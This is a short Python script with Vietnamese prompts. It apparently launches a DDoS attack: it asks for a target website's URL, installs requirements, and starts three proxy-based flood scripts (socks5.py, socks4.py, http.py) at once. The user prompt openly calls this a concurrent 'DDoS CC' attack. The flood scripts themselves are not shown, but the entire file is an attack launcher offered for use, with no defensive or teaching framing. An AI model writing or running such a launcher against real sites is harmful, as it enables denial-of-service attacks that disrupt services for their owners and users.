import os
import subprocess

# Hiển thị thông báo và chờ người dùng nhấn Enter
input("Nhấn Enter để tiếp tục. Sau khi nhấn Enter, sẽ khởi chạy 3 quy trình tấn công DDoS CC cùng lúc. Để có tùy chọn khác, vui lòng sử dụng Terminal.")

# Nhập URL của trang web cần tấn công
SETURL = input("Nhập URL trang web cần tấn công: ")
PROXY = "./"
VERIFY = "-down -check"

# Cài đặt thư viện từ requirements.txt
subprocess.run(["pip3", "install", "-r", "requirements.txt"])

# Khởi chạy các file Python thay vì file .bat
subprocess.Popen(["python", "socks5.py", SETURL, PROXY, VERIFY], shell=True)
subprocess.Popen(["python", "socks4.py", SETURL, PROXY, VERIFY], shell=True)
subprocess.Popen(["python", "http.py", SETURL, PROXY, VERIFY], shell=True)
